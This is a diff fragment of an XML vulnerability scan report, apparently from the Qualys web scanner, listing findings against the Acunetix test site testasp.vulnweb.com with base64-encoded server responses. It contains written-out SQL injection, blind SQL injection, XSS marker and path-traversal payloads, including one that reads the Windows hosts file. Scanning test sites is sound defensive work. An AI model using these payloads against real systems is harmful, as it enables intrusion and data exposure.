+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7cXNzJmd0OycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvc2hvd3RocmVhZC5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id='%3B(function()%7bqxss%7d)%3B%2F%2F]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnOyhmdW5jdGlvbigpe3F4c3N9KTsvLycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvc2hvd3RocmVhZC5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showforum.asp?id=0%20AND%20NULL%20IS%20NULL%20]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=0%20OR%204%3D4--%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogNTAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3dmb3J1bS5hc3A_aWQ9MCUyME9SJTIwNCUzRDQtLSUyMAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd2ZvcnVtLmFzcD9pZD0wJTIwQU5EJTIwNCUzRDUtLSUyMA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=0%20OR%20NULL%20IS%20NULL%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3dmb3J1bS5hc3A_aWQ9MCUyME9SJTIwTlVMTCUyMElTJTIwTlVMTCUyMAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd2ZvcnVtLmFzcD9pZD0wJTIwT1IlMjA2JTIwSVMlMjBOVUxMJTIw]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=0%20AND%20NULL%20IS%20NULL%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogNTAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3dmb3J1bS5hc3A_aWQ9MCUyMEFORCUyME5VTEwlMjBJUyUyME5VTEwlMjAKCkZhbHNlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3dmb3J1bS5hc3A_aWQ9MCUyMEFORCUyMDclMjBJUyUyME5VTEwlMjA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showforum.asp?id=*%2F%3B(function()%7bqxss%7d)%3B%2F*]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[<script%20=">"%20SRC=//localhost/j>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3dmb3J1bS5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[%20<script>_q_q=random()</script>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3dmb3J1bS5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[<script%20src=//localhost/j>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZsdDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3dmb3J1bS5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTeW50YXggZXJyb3IsIHBlcm1pc3Npb24gdmlvbGF0aW9uLCBvciBvdGhlciBub25zcGVjaWZpYyBlcnJvciZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3dmb3J1bS5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbnZhbGlkIGNvbHVtbiBuYW1lICd6Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93Zm9ydW0uYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150003</qid>
+        <title><![CDATA[SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showforum.asp?id='%3B(function()%7bqxss%7d)%3B%2F%2F]]></uri>
+        <param>id</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22%3E%3Cqss%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJmd0OyZsdDtxc3MmZ3Q7Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93Zm9ydW0uYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7cXNzIGA7IS0tPSZhbXA7eygpfSZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L3Nob3dmb3J1bS5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgOSZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=0%22'%3E%3Cqss%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7cXNzJmd0OycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvc2hvd2ZvcnVtLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSA5Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id='%3B(function()%7bqxss%7d)%3B%2F%2F]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnOyhmdW5jdGlvbigpe3F4c3N9KTsvLycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvc2hvd2ZvcnVtLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSA5Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[id=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAnJyZndDsmbHQ7Jmx0O1NDUklQVCBhPTImZ3Q7cXNzPTc7Ly8mbHQ7Jmx0Oy9TQ1JJUFQmZ3Q7Jy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9zaG93Zm9ydW0uYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDkmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showforum.asp?id=2]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/showforum.asp?id=2]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150011</qid>
+        <title><![CDATA[Local File Inclusion]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts%00]]></uri>
+        <param>item</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[item=..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts%00]]></payload>
+                    <result base64="true"><![CDATA[cnMlMjUyRmV0YyUyNTJGaG9zdHMlMjUwMCIgY2xhc3M9Im1lbnUiJmd0O3JlZ2lzdGVyJmx0Oy9hJmd0OyANCiAgICAmbHQ7L2RpdiZndDsmbHQ7L3RkJmd0OyANCiAgJmx0Oy90ciZndDsgDQogICZsdDt0ciZndDsgDQogICAgJmx0O3RkIGNvbHNwYW49IjIiJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9Ik1haW5Db250ZW50TGVmdCIgLS0mZ3Q7DQoJCSMgQ29weXJpZ2h0IChjKSAxOTkzLTE5OTkgTWljcm9zb2Z0IENvcnAuDQojDQojIFRoaXMgaXMgYSBzYW1wbGUgSE9TVFMgZmlsZSB1c2VkIGJ5IE1pY3Jvc29mdCBUQ1AvSVAgZm9yIFdpbmRvd3MuDQojDQojIFRoaXMgZmlsZSBjb250YWlucyB0aGUgbWFwcGluZ3Mgb2YgSVAgYWRkcmVzc2VzIHRvIGhvc3QgbmFtZXMuIEVhY2gNCiMgZW50cnkgc2hvdWxkIGJlIGtlcHQgb24gYW4gaW5kaXZpZHVhbCBsaW5lLiBUaGUgSVAgYWRkcmVzcyBzaG91bGQNCiMgYmUgcGxhY2VkIGluIHRoZSBmaXJzdCBjb2x1bW4gZm9sbG93ZWQgYnkgdGhlIGNvcnJlc3BvbmRpbmcgaG9zdCBuYW1lLg0]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20]]></uri>
+        <param>tfSearch</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Search.asp]]></form>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[<script%20src=http://localhost/j%20]]></payload>
+                    <result base64="true"><![CDATA[DQombHQ7IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIiZndDsNCiZsdDtodG1sJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbiB0ZW1wbGF0ZT0iL1RlbXBsYXRlcy9NYWluVGVtcGxhdGUuZHd0LmFzcCIgY29kZU91dHNpZGVIVE1MSXNMb2NrZWQ9ImZhbHNlIiAtLSZndDsNCiZsdDtoZWFkJmd0Ow0KJmx0OyEtLSBJbnN0YW5jZUJlZ2luRWRpdGFibGUgbmFtZT0iZG9jdGl0bGUiIC0tJmd0Ow0KJmx0O3RpdGxlJmd0O2FjdWZvcnVtIHNlYXJjaCZsdDsvdGl0bGUmZ3Q7DQombHQ7IS0tIEluc3RhbmNlRW5kRWRpdGFibGUgLS0mZ3Q7DQombHQ7bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xIiZndDsNCiZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9ImhlYWQiIC0tJmd0OyZsdDshLS0gSW5zdGFuY2VFbmRFZGl0YWJsZSAtLSZndDsNCiZsdDtsaW5rIGhyZWY9InN0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiJmd0Ow0KJmx0Oy9oZWFkJmd0Ow0KJmx0O2JvZHkmZ3Q7IA0KJmx0O3RhYmxlIHdpZHRoPSIxMDAlIiAgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMTAiIGNlbGxzcGFjaW5nPSIwIiZndDsgDQogICZsdDt0ciBiZ2NvbG9yPSIjMDA4RjAwIiZndDsgDQogICAgJmx0O3RkIHdpZHRoPSIzMDZweCImZ3Q7Jmx0O2EgaHJlZj0iaHR0cDovL3d3dy5hY3VuZXRpeC5jb20vIiZndDsmbHQ7aW1nIHNyYz0iSW1hZ2VzL2xvZ28uZ2lmIiB3aWR0aD0iMzA2IiBoZWlnaHQ9IjM4IiBib3JkZXI9IjAiJmd0OyZsdDsvYSZndDsmbHQ7L3RkJmd0OyANCiAgICAmbHQ7dGQgYWxpZ249InJpZ2h0IiB2YWxpZ249Im1pZGRsZSIgYmdjb2xvcj0iIzAwOEYwMCIgY2xhc3M9ImRpc2NsYWltZXIiJmd0O1RFU1QgYW5kIERlbW9uc3RyYXRpb24gc2l0ZSBmb3IgQWN1bmV0aXggV2ViIFZ1bG5lcmFiaWxpdHkgU2Nhbm5lciZsdDsvdGQmZ3Q7IA0KICAmbHQ7L3RyJmd0OyANCiAgJmx0O3RyJmd0OyANCiAgICAmbHQ7dGQgY29sc3Bhbj0iMiImZ3Q7Jmx0O2RpdiBjbGFzcz0ibWVudWJhciImZ3Q7Jmx0O2EgaHJlZj0iVGVtcA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
